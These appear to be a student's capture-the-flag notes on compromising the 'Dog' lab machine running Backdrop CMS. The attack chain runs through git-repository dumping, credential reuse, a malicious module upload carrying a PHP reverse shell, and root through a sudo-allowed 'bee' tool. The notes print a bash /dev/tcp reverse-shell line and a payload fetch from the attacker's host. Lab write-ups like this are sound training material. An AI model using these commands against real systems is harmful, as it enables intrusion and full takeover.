- nmap shows http port and something about cms backdrop
	- git repository
- browser leads to dog.htb which we add to /etc/hosts
- ffuf doesnt help..neither does dirbuster
- checkiing .git/ repo we find in logs a commit of root. also shows (dog@dog.htb) which could be a user. on checking login it doesnt work.
- we dump git repo using git-dumper **NEW TOOL**
- we find settings.php which holds a mysql credential (listed above)
- **we grep the git repo dumps for anything with @dog.htb**
	- we find tiffany
- attempt to login to website with tiffy and sql pwd we obtained
	- logged in.
- we find a cms exploit via searchsploit for authenticated remote command injection
	- what i did was a bit different here
	- i executed the python file which created a shell and its zip.
		- i opened the shell and replaced the shell.php with pentestmonkeys reverse shell and my creds
		- i tar'd it
- i uploaded this tar file as a module 
	- then i went to /module/shell/ via url (shell because of waht exploit said after executing)
- with netcat listening i opened my reverse shell
	- gained access as www-data
- su johncusack
	- mysql pd
- i cat read user.txt
- ssh into johncusack
- sudo -l
	- sudo /usr/local/bin/bee
		- get a list of commands
		- cant execute as not bootstrapped
		- /var/www/html (this is root directory for backdrop)
		- sudo /usr/local/bin/bee install # not sure if needed but i think thats how you bootstrap if  not already after going to the directory
		- tried to php execute with eval (i think you can)
			- didnt work
		- hosted a server to capture my php reverse shell
			- send to target 
- sudo /usr/local/bin/bee php-script /home/johncusack/php-reverse-shell.php while having netcat listen on that port
- gain root privilege
- code:
	```bash
pipx install git-dumper
git-dumper http://10.10.11.58/.git/ ./dog_repo # .git/ not necessary
cd dog_repo
cat settings.php
```
	- we get
		```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```
		- Mysql Credentials:
			- user : root
			- password : BackDropJ2024DS2024
	```bash
git log
```
	- gives us :
		```bash
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
```
		- we see dog@dog.htb 
	```bash
grep -r "@dog.htb"
```
	- we get :
		```bash
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```
		- we find user tiffany@dog.htb
		- we try with mysql password at web page 
## Gaining Initial Foothold
- After we log in to web page as tiffany we need to try and get a foothold in the machine.
	- we look for ways to upload files or url.
	- we can :
		- create a page : tried to upload php file here but it only accepted specific image formats. then tried to send the file with .php.jpg format to bypass it but it renamed file so maybe they sanitized it. uploads were stored in /files/field/image/
		- publish a post : no upload, maybe content source?
		- add a card : again tried to upload but sanitized. 
		- **Module**
			- accepts tar files.
			- I searched exploits of backdrop cms 1 and downloaded the python script for Authenticated Remote Command Execution (RCE).
				```bash
searchsploit cms backdrop 1
searchsploit -m php/webapps/52021.py
python3 52021.py http://10.10.11.58
```
				- This gave me an output:
					```bash
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```
				- I executed the script which created a shell folder and shell.zip file.
				- I tried to upload that file but it didn't work as it wasn't a supported file.
					- ideally  after modifying the script if you compress with tar it should work but i didnt do that.
					- **however i replaced the php file with my pentestmonkey file and tar'd that.**
				- I uploaded the module (Functionality>Install ne modules>Manual Installation) or at (close to what the output of exploit said) :
					```bash
http://10.10.11.58/?q=admin/modules/install
```
					- more specifically at:
						```bash
http://10.10.11.58/?q=admin/installer/manual
```
				- which installed the module which i could access at (based on output of exploit):
					```bash
http://10.10.11.58/modules/shell
```
				- turned on netcat listener at my port and selected my php shell from the browser to gain foothold as www-data.
- next we tyr to identify a user as www-data user can't do much
	- at /home we find two users folders :
		- jobert : nothing inside
		- johncusack : user.txt
	- we can't do anything in these files.
		- attempt to switch user to johncusack
			- use sql credentials
			- it works and we can read user.txt
			- can ssh into machine for better shell
## Privilege escalation
- pass command:
	```bash
sudo -l
```
	- shows we can pass this as sudo/root:
		```bash
/usr/local/bin/bee
```
- pass sudo /usr/local/bin/bee
	- we get some commands we can use.
		- however it doesn't work as they need to be bootstrapped
		- tried install and said we need to go to the correct directory.
		- initially tried backdrop_tools/bee but it was wrong
		- then tried /var/www/html/
			- worked and installed
			- then i could pass more commands
				- what stoop out was eval and php-script which allowed us to run/execute php scripts
			- i initially tried eval and inputting bash with variations of this :
				```bash
bash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'
```
				- However i couldn't figure out the correct syntax to send to my netcat listener. I did notice that when i sent:
					```bash
sudo /usr/local/bin/bee eval >& /dev/tcp/<local_ip>/9998 0>&1
```
				- my netcat listener did pick up something but terminated or if i passed the bash -i command without quotes it did the same so something was working. maybe i had to account for spaces. but bash was being viewed as a constant too.
			- i then moved to php-script
				- it required i file.
				- I hosted where my php reverse shell file was on my machine via :
					```python
python3 -m http.server 8001
```
				- and pulled my file via the command (note, you wont be able to pull in /var/www/html)
					```bash
wget http://10.10.14.25:8001/php-reverse-shell.php
```
				- passed the following command while having netcat listener present:
					```bash
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-script /home/johncusack/php-reverse-shell.php
```
					- gained root and caught root flag at /root/root.txt
## Code Analysis
- /usr/local/bin/bee called some functions.
- once i found backdrop_tool/bee
	- found bee.php which was similar code to earlier at /usr/local/bin/bee
- i grepped for :
	```bash
grep -r "function bee_" /backdrop_tool/bee/
```
	- and found :
		```bash
/backdrop_tool/bee/includes/command.inc and other files here
```
		- was the functions that was called from /usr/local/bin/bee
			- which could be analyzed to understand more about the fault of this binary
-------
## Rabbit holes
- Burpsuite:
	- fell into trying to use the cookie i received when trying to reset password of dogBackDropSystem as that was the only user that didnt return unknown user.
- knowing what to grep can help a lot as otherwise had to enumerate each repo and unfortunately for me the very few i didnt look at contained the tiffany username